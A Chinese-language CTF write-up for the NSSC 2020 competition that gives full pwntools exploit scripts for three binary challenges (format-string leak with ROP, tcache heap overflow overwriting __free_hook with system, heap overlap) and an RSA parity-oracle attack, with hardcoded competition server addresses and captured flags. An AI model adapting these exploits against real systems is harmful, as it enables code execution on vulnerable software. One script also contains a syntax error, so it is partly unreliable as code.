# NSSC 2020 CTF WP

这次比赛表现得不是很好，题目不是很难，也怪自己没把握住时间，第三道比赛刚结束就打通了。。。这次名次为10，下次好好加油！



# pwn1[Echo]

通过利用字符串漏洞泄漏libc基地址, elf基地址, 修改 _IO_FILE struct,然后打入stack 中的 &main ret构造rop链

```python
#!/usr/bin/env python3
#-*- coding:utf-8 -*-
# Author: i0gan
# Env: Linux arch 5.8.14-arch1-1

from pwn import *
import os

r   =  lambda x : io.recv(x)
ra  =  lambda   : io.recvall()
rl  =  lambda   : io.recvline(keepends = True)
ru  =  lambda x : io.recvuntil(x, drop = True)
s   =  lambda x : io.send(x)
sl  =  lambda x : io.sendline(x)
sa  =  lambda x, y : io.sendafter(x, y)
sla =  lambda x, y : io.sendlineafter(x, y)
ia  =  lambda : io.interactive()
c   =  lambda : io.close()
li  = lambda x : log.info('\x1b[01;38;5;214m' + x + '\x1b[0m')


context.log_level='debug'
context.terminal = ['tmux', 'splitw', '-h']

elf_path  = 'Echo'
MODIFY_LD = 0
arch = '64'
libc_v = '2.23'

ld_path   = '/glibc/' + libc_v + '/' + arch + '/lib/ld-linux-x86-64.so.2'
libs_path = '/glibc/' + libc_v + '/' + arch + '/lib'
libc_path = '/glibc/' + libc_v + '/' + arch + '/lib/libc.so.6'
libc_path = './libc.so.6'
# change ld path 
if(MODIFY_LD):
	os.system('cp ' + elf_path + ' ' + elf_path + '.bk')
	change_ld_cmd = 'patchelf  --set-interpreter ' + ld_path +' ' + elf_path
	os.system(change_ld_cmd)
	li('modify ld ok!')
	exit(0)
# remote server ip and port
server_ip = "121.36.216.253"
server_port = 10001
# if local debug
LOCAL = 0
LIBC  = 1
#--------------------------func-----------------------------
def db():
	if(LOCAL):
		gdb.attach(io)
#--------------------------exploit--------------------------
def exploit():
	li('exploit...')
	#leak elf
	sla('>>', '2')
	sla(':', '7')
	sl('%20$p')
	ru('0x')
	elf_base = int(r(12), 16) - (0x562a00b85150-  0x562a00b84000  )
	li('elf_base: ' + hex(elf_base))
	pop_rdi = elf_base + 0x11b3
	
	sla('>>', '2')
	sla(':', '7')
	sl('%21$p')
	ru('0x')
	libc_base = int(r(12), 16) - libc.sym['__libc_start_main'] - 240
	li('libc_base: ' + hex(libc_base))
	sys_addr = libc_base + libc.sym['system']
	sh_addr  = libc_base + 0x18ce17
	sla('>>', '2')
	sla(':', '7')
	sl('%23$p')
	ru('0x')
	stack_ret = int(r(12), 16) - 0xe0
	li('stack_ret: ' + hex(stack_ret))
	_IO_2_1_stdin_ = libc_base + libc.sym['_IO_2_1_stdin_']
	_IO_buf_base = _IO_2_1_stdin_ + 0x8 * 7
	li('_IO_buf_base: ' + hex(_IO_buf_base))
	sla('>>', str(1))
	p = p64(_IO_buf_base)
	sl(p)
	sla('>>', str(2))
	sla(':', str(7))
	#sl('%16$p')
	s('%16$hhn')
	p = p64(_IO_2_1_stdin_ + 0x83) * 3
	p += p64(stack_ret) + p64(stack_ret + 0x8 * 3)
	sla('>>', str(2))
	sa(':', p) #length:
	sl('')
	for i in range(0, len(p) - 1):
		sla('>>', str(2))
		sla(':', ',')
		sl(' ')
	sla('>>', str(2))
	p = p64(pop_rdi) + p64(sh_addr) + p64(sys_addr)
	sla(':', p) #length:
	sl('')
	#db()
	sla('>>', str(3))
def finish():
	ia()
	c()

#--------------------------main-----------------------------
if __name__ == '__main__':
	
	if LOCAL:
		elf = ELF(elf_path)
		if LIBC:
			libc = ELF(libc_path)
			io = elf.process(env= {"LD_PRELOAD" : libc_path} )
		else:
			io = elf.process()
	
	else:
		elf = ELF(elf_path)
		io = remote(server_ip, server_port)
		if LIBC:
			libc = ELF(libc_path)

	exploit()
	finish()
```

flag{0HOk4cUYpmi6tVAjQSR5zdZRHPSnpeeW}



# pwn2 [noteplus]

```c
 if ( v6 <= 0xF )
  {
    if ( p_addr[v6] )
    {
      std::__ostream_insert<char,std::char_traits<char>>(&std::cout, "Content: ", 9LL);
      addr = p_addr[v0];
      size = p_size[v0];
      if ( size != 8 )
      {
        buf = (_BYTE *)(addr + 8);
        v4 = (_BYTE *)(size + addr);
        do
        {
          read(0, buf, 1uLL);
          if ( *buf == 10 )
            break;
          ++buf; //vul
        }
        while ( v4 != buf );
      }
    }
  }
```

若开辟大小为0, 则可造成堆溢出, 修改tcahe bin fd，实现任意地址开辟，修改free_hook为system

```python
#!/usr/bin/env python3
#-*- coding:utf-8 -*-
# Author: i0gan
# Env: Linux arch 5.8.14-arch1-1

from pwn import *
import os

r   =  lambda x : io.recv(x)
ra  =  lambda   : io.recvall()
rl  =  lambda   : io.recvline(keepends = True)
ru  =  lambda x : io.recvuntil(x, drop = True)
s   =  lambda x : io.send(x)
sl  =  lambda x : io.sendline(x)
sa  =  lambda x, y : io.sendafter(x, y)
sla =  lambda x, y : io.sendlineafter(x, y)
ia  =  lambda : io.interactive()
c   =  lambda : io.close()
li  = lambda x : log.info('\x1b[01;38;5;214m' + x + '\x1b[0m')


context.log_level='debug'
context.terminal = ['tmux', 'splitw', '-h']

elf_path  = 'pwn'
MODIFY_LD = 0
arch = '64'
libc_v = '2.27'

ld_path   = '/glibc/' + libc_v + '/' + arch + '/lib/ld-linux-x86-64.so.2'
libs_path = '/glibc/' + libc_v + '/' + arch + '/lib'
libc_path = '/glibc/' + libc_v + '/' + arch + '/lib/libc.so.6'
libc_path = './libc.so.6'

# change ld path 
if(MODIFY_LD):
	os.system('cp ' + elf_path + ' ' + elf_path + '.bk')
	change_ld_cmd = 'patchelf  --set-interpreter ' + ld_path +' ' + elf_path
	os.system(change_ld_cmd)
	li('modify ld ok!')
	exit(0)

# remote server ip and port
server_ip = "121.36.245.213"
server_port = 23333

# if local debug
LOCAL = 0
LIBC  = 1


#--------------------------func-----------------------------
def db():
	if(LOCAL):
		gdb.attach(io)

def ad(i, size):
	sla('Your choice:', '1')
	sla(':', str(i))
	sla(':', str(size))
	
def rm(i):
	sla(':', '2')
	sla(':', str(i))

def md(i, d):
	sla(':', '3')
	sla(':', str(i))
	sla(':', d)

def dp(i):
	sla(':', '4')
	sla(':', str(i))

#--------------------------exploit--------------------------
def exploit():
	li('exploit...')
	ad(0, 0)
	ad(1, 0x100)
	ad(2, 0xf0)
	ad(3, 0xf0)
	ad(4, 0xf0)
	ad(5, 0xf0)
	ad(6, 0x100)
	ad(7, 0x60)
	p = p64(0) + p64(0)
	p += p64(0x511)
	md(0x0, p)
	rm(1)
	ad(1, 0x80)
	dp(1)
	leak = u64(ru('\x7f')[-5:] + b'\x7f\x00\x00')
	li('leak: ' + hex(leak))
	main_arena = 0x3afc40 #local
	main_arena = 0x3ebc40
	libc_base = leak - main_arena - 0x430 - 96
	free_hook = libc_base + libc.sym['__free_hook']
	li('libc_base: ' + hex(libc_base))
	rm(1)
	p = p64(0) + p64(0)
	p += p64(0x91)
	p += p64(free_hook - 8)
	md(0x0, p)
	ad(1, 0x80)
	md(1, 'B' * 28)
	ad(8, 0x80) # malloc to free_hook
	md(8, p64(libc_base + libc.sym['system']))
	p = p64(0) + p64(0)
	p += p64(0x91)
	p += b'/bin/sh\x00'
	md(0, p)
	db()
	rm(1)
    
def finish():
	ia()
	c()

#--------------------------main-----------------------------
if __name__ == '__main__':
	
	if LOCAL:
		elf = ELF(elf_path)
		if LIBC:
			libc = ELF(libc_path)
			io = elf.process(env = {"LD_LIBRARY_PATH" : libs_path, "LD_PRELOAD" : libc_path} )
		else:
			io = elf.process(env = {"LD_LIBRARY_PATH" : libs_path} )
	
	else:
		elf = ELF(elf_path)
		io = remote(server_ip, server_port)
		if LIBC:
			libc = ELF(libc_path)

	exploit()
	finish()
```

flag{ovgwkjRhB0EDgSHvp7ihCGPiRqHGAfUI}



# pwn3 [youchat]

当时网络有点差，比赛结束几分钟刚好打通远程，都怪没有看到update功能。。。

这个漏洞在添加用户后，logout用户时，会释放当前内存地址-0x10，若控制好 addr-0x10处的大小，即可控制堆重叠，修改tcache fd为free_hook。

```python
#!/usr/bin/env python3
#-*- coding:utf-8 -*-
# Author: i0gan
# Env: Linux arch 5.8.14-arch1-1

from pwn import *
import os

r   =  lambda x : io.recv(x)
ra  =  lambda   : io.recvall()
rl  =  lambda   : io.recvline(keepends = True)
ru  =  lambda x : io.recvuntil(x, drop = True)
s   =  lambda x : io.send(x)
sl  =  lambda x : io.sendline(x)
sa  =  lambda x, y : io.sendafter(x, y)
sla =  lambda x, y : io.sendlineafter(x, y)
ia  =  lambda : io.interactive()
c   =  lambda : io.close()
li  = lambda x : log.info('\x1b[01;38;5;214m' + x + '\x1b[0m')

context.log_level='debug'
context.terminal = ['tmux', 'splitw', '-h']

elf_path  = 'pwn'
MODIFY_LD = 0
arch = '64'
libc_v = '2.27'

ld_path   = '/glibc/' + libc_v + '/' + arch + '/lib/ld-linux-x86-64.so.2'
libs_path = '/glibc/' + libc_v + '/' + arch + '/lib'
libc_path = '/glibc/' + libc_v + '/' + arch + '/lib/libc.so.6'
libc_path = './libc.so.6'

# change ld path 
if(MODIFY_LD):
	os.system('cp ' + elf_path + ' ' + elf_path + '.bk')
	change_ld_cmd = 'patchelf  --set-interpreter ' + ld_path +' ' + elf_path
	os.system(change_ld_cmd)
	li('modify ld ok!')
	exit(0)
# remote server ip and port
server_ip = "124.70.158.59"
server_port = 30023
# if local debug
LOCAL = 0
LIBC  = 1
#--------------------------func-----------------------------
def db():
	if(LOCAL):
		gdb.attach(io
def add(idx, i, d, d2):
	sla('Your choice:', '1')
	sla(':', str(idx))
	sla(':', str(i))
	sa(':', d)
	sla(':', d2)
def logout(i):
	sla('Your choice:', '2')
	sla(':', str(i))
def update(i, n):
	sla('Your choice:', '3')
	sla(':', str(i))
	sla(':', n)
def view(i):
	sla('Your choice:', '4')
	sla(':', str(i))
def chat():
	sla('Your choice:', '4')
#--------------------------exploit--------------------------
def exploit():
	li('exploit...')
	add(0, 0x81, b'A' * 0x58 + p64(0x4B1), b'C' * 0x10)
	add(1, 0x81, b'B' * 0x1, 'B' * 0x10)
	add(2, 0x81, 'C' * 0x1, 'D' * 0x10)
	add(3, 0x81, '/bin/sh\x00' * 0x1, 'E' * 0x10)
	add(4, 0x81, 'E' * 0x1, 'F' * 0x10)
	add(5, 0x81, 'F' * 0x1, 'G' * 0x10)
	add(6, 0x81, '/bin/sh\x00' * 0x1, 'H' * 0x10)
	add(7, 0x80, 'H' * 0x70, 'B' * 0x10)

	logout(1)
	add(8, 0x81, b'B' * 0x1, 'B' * 0x10)
	view(8)
	
	leak = u64(ru('\x7f')[-5:] + b'\x7f\x00\x00') 
	main_arena = 0x3afc40 # local
	main_arena = 0x3ebc40 # local
	libc_base = leak - main_arena - 0x3a2 - 96
	free_hook = libc_base + libc.sym['__free_hook']
	sh_str = libc_base +  0x1b40fa
	li('libc_base: ' + hex(libc_base))
	
	add(9, 0x40, b'O' * 0x28 + p64(0x41) + p64(0) +  p64(0x91), '')
	logout(2)
	add(10, 0x30, b'G' * 0x10 + p64(free_hook) + p64(free_hook), p64(free_hook))

	add(11, 0x81, 'F' * 0x1, 'G' * 0x10)

	add(12, 0x81, p64(libc_base + libc.sym['system']), b'G' * 0x8 + p64(0x91))

	add(1, 0x81, '/bin/sh\x00' + 'A' * 0x10, 'G' * 0x10)
	update(1, '/bin/sh\x00')
	#db()
	logout(1)
def finish():
	ia()
	c()

#--------------------------main-----------------------------
if __name__ == '__main__':
	
	if LOCAL:
		elf = ELF(elf_path)
		if LIBC:
			libc = ELF(libc_path)
			io = elf.process(env = {"LD_LIBRARY_PATH" : libs_path, "LD_PRELOAD" : libc_path} )
		else:
			io = elf.process(env = {"LD_LIBRARY_PATH" : libs_path} )
	
	else:
		elf = ELF(elf_path)
		io = remote(server_ip, server_port)
		if LIBC:
			libc = ELF(libc_path)

	exploit()
	finish()
```

flag{KNT5Z3gX6H9Honi5CH18kYHutIp7E8LD}

# Crypto3 [crypto_lp]

rsa侧信道攻击

该exp与是happi0师傅合作编写的，两个合作搞了半天，打通后，只打印flag前面部分，后面的数全为空，原因是没有整除查找，输出的是浮点类型的数。。。后面happi0师傅找到了原因并且打通了^_^，自己不懂，先贴着。

```python
#!/usr/bin/python

from pwn import *
import os
from Crypto.Util.number import long_to_bytes
from tqdm import tqdm


r   =  lambda x : io.recv(x)
ra  =  lambda   : io.recvall()
rl  =  lambda   : io.recvline(keepends = True)
ru  =  lambda x : io.recvuntil(x, drop = True)
s   =  lambda x : io.send(x)
sl  =  lambda x : io.sendline(x)
sa  =  lambda x, y : io.sendafter(x, y)
sla =  lambda x, y : io.sendlineafter(x, y)
ia  =  lambda : io.interactive()
c   =  lambda : io.close()
li    = lambda x : log.info('\x1b[01;38;5;214m' + x + '\x1b[0m')

#context.log_level='debug'
context.terminal = ['tmux', 'splitw', '-h']
#--------------------------func-----------------------------
def db():
    if(LOCAL):
        gdb.attach(io)


def get(scret, c):
    sl('o')
    sl(str(scret))
    sl(str(c))
    ru('>')
    cd = int(ru('\n'), 10)
    #li('cd: ' + str(c))
    return cd
    

#--------------------------exploit--------------------------
def exploit():
    li('exploit...')
    ru('\n')
    n = int(ru('\n'),10)
    nn = int(ru('\n'),10)
    C = int(ru('\n'),10)

    li('n: ' + str(n))
    li('nn: ' + str(nn))
    li('c ' + str(c))

    sl('l')
    ru('>')
    tmp1 = int(ru('\n'),10)
    li('tmp1 ' + str(tmp1))
    
    sl('p')
    sl(str(tmp1 + n))
    ru('>')
    scret = int(ru('\n'),10)
    
    l = 0
    r = nn
    i = 0;
    while(l != r):
        C = C * pow(2, 65537, nn) % nn
        ret = get(scret, C)
        li('times:' + str(i) +' ret: ' + str(ret))
        if(ret == 0):
            r = (l + r) // 2
        else:
            l = (l + r) // 2
        i += 1
    l = int(l)
    l1 = l - 1
    l2 = l + 1
    li('GET FLAG:\n' + str(l))
    li('flag: ' + str(l))
    li(b'flag: ' + long_to_bytes(l))
    li(b'flag: ' + long_to_bytes(l1))
    li(b'flag: ' + long_to_bytes(l2))

def finish():
    ia()
    c()

#--------------------------main-----------------------------
if __name__ == '__main__':
    io = remote('119.3.152.203', 7001)

    exploit()
    finish()
```

